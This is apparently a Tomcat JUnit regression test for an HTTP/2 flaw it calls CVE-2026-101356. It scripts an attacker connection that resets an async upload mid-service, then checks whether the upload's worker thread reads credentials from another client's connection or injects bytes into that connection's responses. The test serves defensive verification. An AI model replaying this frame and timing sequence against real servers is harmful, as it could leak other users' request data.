/*
 *  Licensed to the Apache Software Foundation (ASF) under one or more
 *  contributor license agreements.  See the NOTICE file distributed with
 *  this work for additional information regarding copyright ownership.
 *  The ASF licenses this file to You under the Apache License, Version 2.0
 *  (the "License"); you may not use this file except in compliance with
 *  the License.  You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package org.apache.tomcat.security;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.Queue;
import java.util.concurrent.ConcurrentLinkedQueue;

import jakarta.servlet.AsyncContext;
import jakarta.servlet.AsyncEvent;
import jakarta.servlet.AsyncListener;
import jakarta.servlet.ServletInputStream;
import jakarta.servlet.ServletOutputStream;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import org.junit.Assert;
import org.junit.Test;

import org.apache.catalina.Context;
import org.apache.catalina.LifecycleException;
import org.apache.catalina.Wrapper;
import org.apache.catalina.startup.Tomcat;
import org.apache.coyote.http2.Http2TestBase;
import org.apache.coyote.http2.TesterHttp2Parser;

public class TestSecurity2026Http2 extends Http2TestBase {

    static final Queue<String> foreignReads = new ConcurrentLinkedQueue<>();
    static final long SERVICE_MS = 100;
    static final long PROCESS_MS = 600;
    static final long VICTIM_HANDLER_MS = 400;

    /*
     * Test for gap in MUST_ERROR handling in AsyncStateMachine (stream reset while an async servlet's service() is
     * running).
     *
     *   attacker connection: POST /upload (HEADERS + 10-byte DATA, no END_STREAM), then TCP close ~10 ms later.
     *                        /upload starts async; a worker thread reads the body chunk by chunk, spending a while on
     *                        each chunk; onError() does nothing (the worker will find out on its next read).
     *   victim connection:   a busy multiplexed h2 connection doing POST /victim (a 400 ms handler) with secrets in
     *                        the body - some of its streams are queued behind maxConcurrentStreamExecution (default).
     *
     * Bug iff the /upload worker reads a victim secret, or a victim stream carries bytes VictimServlet never wrote.
     */
    @Test
    public void testCVE_2026_101356() throws Exception {
        foreignReads.clear();
        enableHttp2(false);
        configureAndStartWebApplication();

        boolean injected = false;
        int secretSeq = 0;
        for (int round = 0; round < 3 && foreignReads.isEmpty() && !injected; round++) {
            Client victim = new Client();
            victim.frames.setTraceBody(true);

            // victim connection is busy: 30 requests in flight (20 executing, 10 queued)
            victim.send(victim.posts(30, "pad=" + round));
            Thread.sleep(50);

            // attacker: two uploads, connection dropped while service() is still running
            Client attacker = new Client();
            for (int id = 3; id <= 5; id += 2) {
                byte[] hfh = new byte[9];
                ByteBuffer hp = ByteBuffer.allocate(256);
                byte[] dfh = new byte[9];
                ByteBuffer dp = ByteBuffer.allocate(10);
                attacker.use();
                buildPostRequest(hfh, hp, false, "application/octet-stream", 1000000, "/upload", dfh, dp, null,
                        true /* no END_STREAM on the DATA frame */, id);
                attacker.send(concat(hfh, remaining(hp), dfh, remaining(dp)));
            }
            Thread.sleep(10);
            attacker.socket.setSoLinger(true, 0);
            attacker.socket.close();

            // victim keeps working: another burst, these carry credentials
            Thread.sleep(VICTIM_HANDLER_MS);
            ByteArrayOutputStream burst = new ByteArrayOutputStream();
            for (int i = 0; i < 40; i++) {
                String secret = "user=victim&pass=VICTIM-SECRET-" + (secretSeq++);
                burst.write(victim.post("/victim", secret));
            }
            victim.send(burst.toByteArray());

            // collect victim responses
            String trace = victim.readAll(1500, 6000);
            int ok = 0, err = 0;
            for (String line : trace.split("\n")) {
                if (line.contains("-Body-") && !line.contains("-Body-echo:")) {
                    System.out.println("INJECTION: victim connection (only POSTs /victim -> 'echo:N') received: " + line);
                    injected = true;
                } else if (line.contains("[:status]-[200]")) {
                    ok++;
                } else if (line.contains("[:status]-[500]") || line.contains("-RST-")) {
                    err++;
                }
            }
            System.out.println("round " + round + ": victim streams 200=" + ok + " 500/RST=" + err);
            if (injected) {
                for (String line : trace.split("\n")) {
                    String id = line.contains("-") ? line.substring(0, line.indexOf('-')) : "";
                    if (!id.isEmpty() && trace.contains(id + "-Body-INJECTED")) {
                        System.out.println("    | " + line);
                    }
                }
            }
            victim.socket.close();
            Thread.sleep(PROCESS_MS);
        }
        for (String r : foreignReads) {
            System.out.println("LEAK: /upload worker (attacker's request, attacker's connection long gone) read: " + r);
        }
        Assert.assertFalse("[reset-during-service] useAsyncIO=" + useAsyncIO + ": VULNERABLE", injected);
    }


    public static class UploadServlet extends HttpServlet {
        private static final long serialVersionUID = 1L;

        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
            final AsyncContext ac = req.startAsync();
            ac.setTimeout(30000);
            ac.addListener(new AsyncListener() {
                @Override public void onTimeout(AsyncEvent e) { }
                @Override public void onComplete(AsyncEvent e) { }
                @Override public void onError(AsyncEvent e) { }
                @Override public void onStartAsync(AsyncEvent e) { }
            });
            final ServletInputStream in = req.getInputStream();
            final ServletOutputStream out = resp.getOutputStream();
            Thread worker = new Thread(() -> {
                byte[] buf = new byte[4096];
                try {
                    int n;
                    while ((n = in.read(buf)) != -1) {
                        String s = new String(buf, 0, n, StandardCharsets.ISO_8859_1);
                        if (s.contains("VICTIM-SECRET")) {
                            foreignReads.add(s);
                            out.write(("INJECTED-BY-UPLOAD-WORKER(read " + n + " foreign bytes)")
                                    .getBytes(StandardCharsets.ISO_8859_1));
                            resp.flushBuffer();
                        }
                        Thread.sleep(PROCESS_MS); // process the chunk (store, hash, ...) before reading on
                    }
                    ac.complete();
                } catch (Throwable t) {
                    // read failed / response gone
                }
            }, "upload-worker");
            worker.setDaemon(true);
            worker.start();
            try {
                Thread.sleep(SERVICE_MS); // remaining work in service(); the client's reset lands meanwhile
            } catch (InterruptedException ignore) {
            }
        }
    }

    public static class VictimServlet extends HttpServlet {
        private static final long serialVersionUID = 1L;

        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
            try {
                Thread.sleep(VICTIM_HANDLER_MS); // e.g. authentication back-end
            } catch (InterruptedException ignore) {
            }
            byte[] body = req.getInputStream().readAllBytes();
            resp.setContentType("text/plain");
            resp.getOutputStream().write(("echo:" + body.length).getBytes(StandardCharsets.ISO_8859_1));
        }
    }

    @Override
    protected void configureAndStartWebApplication() throws LifecycleException {
        Tomcat tomcat = getTomcatInstance();
        Context ctxt = getProgrammaticRootContext();
        Tomcat.addServlet(ctxt, "simple", new SimpleServlet());
        ctxt.addServletMapping("/simple", "simple");
        Tomcat.addServlet(ctxt, "victim", new VictimServlet());
        ctxt.addServletMapping("/victim", "victim");
        Wrapper w = Tomcat.addServlet(ctxt, "upload", new UploadServlet());
        w.setAsyncSupported(true);
        ctxt.addServletMapping("/upload", "upload");
        tomcat.start();
    }

    @Override
    protected void enableHttp2(boolean tls) {
        enableHttp2(1000, tls);
    }

    @Override
    protected void validateHttp2InitialResponse() throws Exception {
        validateHttp2InitialResponse(1000);
    }

    private final class Client {
        final Socket socket;
        final OutputStream socketOut;
        final TestOutput frames;
        final TesterHttp2Parser frameParser;
        int nextStreamId = 3;

        Client() throws Exception {
            openClientConnection();
            doHttpUpgrade();
            sendClientPreface();
            validateHttp2InitialResponse();
            socket = s;
            socketOut = os;
            frames = output;
            frameParser = parser;
        }

        void use() {
            s = socket;
            os = socketOut;
            output = frames;
            parser = frameParser;
        }

        void send(byte[] bytes) throws IOException {
            socketOut.write(bytes);
            socketOut.flush();
        }

        byte[] post(String path, String body) throws IOException {
            use();
            int id = nextStreamId;
            nextStreamId += 2;
            byte[] hfh = new byte[9];
            ByteBuffer hp = ByteBuffer.allocate(256);
            byte[] dfh = new byte[9];
            ByteBuffer dp = ByteBuffer.allocate(body.length());
            buildPostRequest(hfh, hp, false, "application/x-www-form-urlencoded", body.length(), path, dfh, dp,
                    null, false, id);
            dp.clear();
            dp.put(body.getBytes(StandardCharsets.ISO_8859_1));
            dp.flip();
            return concat(hfh, remaining(hp), dfh, remaining(dp));
        }

        byte[] posts(int count, String body) throws IOException {
            ByteArrayOutputStream bytes = new ByteArrayOutputStream();
            for (int i = 0; i < count; i++) {
                bytes.write(post("/victim", body));
            }
            return bytes.toByteArray();
        }

        String readAll(int quietMs, int maxMs) throws Exception {
            use();
            StringBuilder sb = new StringBuilder();
            long deadline = System.currentTimeMillis() + maxMs;
            socket.setSoTimeout(quietMs);
            try {
                while (System.currentTimeMillis() < deadline) {
                    try {
                        frameParser.readFrame();
                    } catch (SocketTimeoutException e) {
                        break;
                    }
                    sb.append(frames.getTrace());
                    frames.clearTrace();
                }
            } catch (IOException e) {
                sb.append("[connection ended: ").append(e.getMessage()).append("]\n");
            }
            return sb.toString();
        }
    }

    private static byte[] remaining(ByteBuffer buffer) {
        byte[] bytes = new byte[buffer.remaining()];
        buffer.get(bytes);
        return bytes;
    }

    private static byte[] concat(byte[]... parts) throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        for (byte[] part : parts) {
            bytes.write(part);
        }
        return bytes.toByteArray();
    }
}
